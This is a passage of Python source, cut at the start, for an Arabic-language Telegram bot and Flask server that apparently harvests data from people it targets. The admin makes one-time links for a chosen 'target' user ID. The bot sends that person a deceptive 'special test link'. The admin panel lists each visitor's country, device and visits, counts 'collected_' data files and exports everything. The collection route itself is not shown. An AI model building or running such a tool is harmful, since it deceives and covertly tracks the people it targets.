            "🔗 **إنشاء رابط لمرة واحدة**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📌 أرسل معرف المستخدم (ID) المستهدف:\n"
            "مثال: `123456789`\n\n"
            "⏰ الرابط صالح لمدة 24 ساعة"
        )
        bot.register_next_step_handler(call.message, create_link_step)
        
    elif call.data == "stats":
        show_stats(call.message)
        
    elif call.data == "users":
        show_users(call.message)
        
    elif call.data == "active_links":
        show_active_links(call.message)
        
    elif call.data == "clear_all":
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton("✅ نعم، احذف", callback_data="confirm_clear"),
            InlineKeyboardButton("❌ إلغاء", callback_data="cancel_clear")
        )
        bot.send_message(call.message.chat.id, 
            "⚠️ **تأكيد الحذف**\nهل أنت متأكد من حذف جميع البيانات؟",
            reply_markup=keyboard
        )
        
    elif call.data == "confirm_clear":
        global links_db, users_db
        links_db = {}
        users_db = {}
        save_data()
        bot.send_message(call.message.chat.id, "✅ تم حذف جميع البيانات")
        
    elif call.data == "cancel_clear":
        bot.send_message(call.message.chat.id, "❌ تم الإلغاء")
        
    elif call.data == "export":
        export_data(call.message)
    
    bot.answer_callback_query(call.id)

def create_link_step(msg):
    try:
        target_user_id = int(msg.text.strip())
    except:
        bot.reply_to(msg, "❌ معرف غير صحيح. أرسل أرقاماً فقط.")
        return
    
    link_id = secrets.token_hex(8)
    expires_at = (datetime.now() + timedelta(hours=24)).isoformat()
    
    links_db[link_id] = {
        'target_user_id': target_user_id,
        'created_at': datetime.now().isoformat(),
        'created_by': msg.from_user.id,
        'expires_at': expires_at,
        'used': False,
        'used_at': None
    }
    
    save_data()
    
    link_url = f"{SERVER_URL}/?ref={link_id}"
    
    try:
        bot.send_message(target_user_id,
            f"🔗 **لديك رابط خاص للاختبار**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📌 هذا الرابط مخصص لك فقط\n"
            f"⚠️ يُستخدم مرة واحدة فقط\n"
            f"⏰ صالح لمدة 24 ساعة\n\n"
            f"🔗 **الرابط:** {link_url}"
        )
        bot.send_message(msg.chat.id, f"✅ تم إرسال الرابط للمستخدم {target_user_id}")
    except Exception as e:
        bot.send_message(msg.chat.id, 
            f"⚠️ لم أتمكن من إرسال الرابط للمستخدم {target_user_id}\n"
            f"📌 الخطأ: {e}\n\n"
            f"🔗 **الرابط:** {link_url}"
        )
    
    bot.send_message(msg.chat.id,
        f"✅ **تم إنشاء الرابط**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 المستخدم: `{target_user_id}`\n"
        f"🔗 الرابط: `{link_url}`\n"
        f"⏰ ينتهي: {expires_at[:16]}\n"
        f"🔄 مرة واحدة فقط",
        parse_mode='Markdown'
    )

def show_stats(msg):
    total_links = len(links_db)
    used_links = sum(1 for l in links_db.values() if l.get('used', False))
    active_links = total_links - used_links
    total_users = len(users_db)
    
    stats = f"📊 **الإحصائيات**\n"
    stats += f"━━━━━━━━━━━━━━━━━━━\n"
    stats += f"🔗 **الروابط:**\n"
    stats += f"   • إجمالي: {total_links}\n"
    stats += f"   • مستخدمة: {used_links}\n"
    stats += f"   • نشطة: {active_links}\n\n"
    stats += f"👥 **المستخدمين:**\n"
    stats += f"   • إجمالي: {total_users}\n\n"
    stats += f"📁 **ملفات البيانات:**\n"
    stats += f"   • {len([f for f in os.listdir('.') if f.startswith('collected_')])} ملف"
    
    bot.send_message(msg.chat.id, stats, parse_mode='Markdown')

def show_users(msg):
    if not users_db:
        bot.send_message(msg.chat.id, "❌ لا يوجد مستخدمين بعد")
        return
    
    users_list = "👥 **قائمة المستخدمين**\n━━━━━━━━━━━━━━━━━━━\n"
    for i, (user_id, data) in enumerate(list(users_db.items())[:20], 1):
        users_list += f"{i}. `{user_id[:20]}`\n"
        users_list += f"   • الدولة: {data.get('country', 'غير معروف')}\n"
        users_list += f"   • الجهاز: {data.get('device', 'غير معروف')[:30]}\n"
        users_list += f"   • الزيارات: {data.get('visits', 0)}\n"
        users_list += f"   • الروابط: {len(data.get('data', []))}\n\n"
    
    if len(users_db) > 20:
        users_list += f"... و {len(users_db) - 20} مستخدمين آخرين"
    
    bot.send_message(msg.chat.id, users_list, parse_mode='Markdown')

def show_active_links(msg):
    active = {k: v for k, v in links_db.items() if not v.get('used', False)}
    
    if not active:
        bot.send_message(msg.chat.id, "❌ لا توجد روابط نشطة")
        return
    
    links_list = "🔗 **الروابط النشطة**\n━━━━━━━━━━━━━━━━━━━\n"
    for i, (link_id, data) in enumerate(list(active.items())[:10], 1):
        links_list += f"{i}. `{link_id[:12]}`\n"
        links_list += f"   • المستخدم: `{data.get('target_user_id', 'غير محدد')}`\n"
        links_list += f"   • ينتهي: {data.get('expires_at', 'غير محدد')[:16]}\n\n"
    
    if len(active) > 10:
        links_list += f"... و {len(active) - 10} روابط أخرى"
    
    bot.send_message(msg.chat.id, links_list, parse_mode='Markdown')

def export_data(msg):
    export = {
        'links': links_db,
        'users': users_db,
        'server_url': SERVER_URL,
        'exported_at': datetime.now().isoformat()
    }
    
    filename = f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(export, f, indent=2)
    
    with open(filename, 'rb') as f:
        bot.send_document(msg.chat.id, f, caption="📦 تصدير جميع البيانات")
    
    os.remove(filename)

# ========== تشغيل البوت ==========

def run_bot():
    """تشغيل البوت مع إعادة محاولة تلقائية"""
    global bot
    
    logger.info("🚀 بدء تشغيل البوت...")
    
    while True:
        try:
            if not bot:
                logger.warning("⚠️ البوت غير مهيأ، محاولة إعادة الاتصال...")
                init_bot()
                if not bot:
                    time.sleep(10)
                    continue
            
            logger.info("🔄 بدء polling...")
            bot.polling(none_stop=True, interval=1, timeout=30)
            
        except Exception as e:
            logger.error(f"❌ خطأ في البوت: {e}")
            logger.info("⏳ إعادة المحاولة بعد 10 ثواني...")
            time.sleep(10)

# ========== التشغيل الرئيسي ==========

if __name__ == '__main__':
    load_data()
    
    print("\n" + "="*70)
    print("🛡️  بوت متكامل - يعمل على Render")
    print("="*70)
    print(f"🌐 رابط السيرفر: {SERVER_URL}")
    print(f"👤 معرف المدير: {ADMIN_ID}")
    print(f"📦 حفظ البيانات: {'Supabase' if USE_SUPABASE else 'محلياً'}")
    print("="*70)
    print("\n📌 الأوامر المتاحة في البوت:")
    print("   /start - فتح لوحة التحكم")
    print("   /help - عرض المساعدة")
    print("   /stats - عرض الإحصائيات")
    print("   /users - عرض المستخدمين")
    print("   /links - عرض الروابط النشطة")
    print("   /clear - حذف جميع البيانات")
    print("   /export - تصدير البيانات")
    print("="*70)
    
    # تشغيل البوت في خلفية
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # انتظار ثانية للتأكد من بدء البوت
    time.sleep(2)
    
    # تشغيل Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 تشغيل Flask على المنفذ {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
